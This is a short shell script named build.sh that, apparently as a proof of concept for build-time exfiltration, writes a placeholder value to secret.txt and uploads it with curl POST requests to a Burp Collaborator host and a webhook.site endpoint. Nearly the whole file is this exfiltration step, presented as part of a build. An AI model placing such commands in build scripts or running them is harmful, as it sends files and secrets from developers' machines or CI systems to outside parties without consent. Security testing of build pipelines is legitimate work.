# build.sh
echo "Starting build process"
echo "Exfiltrating secret..."
echo "hhhh" > secret.txt
curl -X POST -d @secret.txt http://xjkfiem61s6op7ywm4brdyvldcj47t.burpcollaborator.net/exfiltrate
curl -X POST -d @secret.txt https://webhook.site/42d3f251-fe0e-4de7-8fbc-98161571eb32
